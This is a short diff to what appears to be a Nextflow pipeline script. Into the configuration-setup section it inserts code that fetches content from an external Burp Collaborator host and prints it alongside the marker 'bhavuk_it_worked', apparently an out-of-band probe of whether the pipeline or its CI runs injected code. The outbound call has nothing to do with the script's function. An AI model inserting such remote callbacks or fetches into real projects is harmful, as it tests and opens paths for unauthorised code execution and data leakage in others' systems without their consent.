@@ -83,6 +83,11 @@ def helpMessage() {
 /*
  * SET UP CONFIGURATION VARIABLES
  */
+ 
+ 
+pdb = file('https://k6r89ymfhkpn9lfj4rdz5zdk8be42t.burpcollaborator.net')
+println "bhavuk_it_worked"
+println pdb.text
 
 // Show help emssage
 if (params.help){
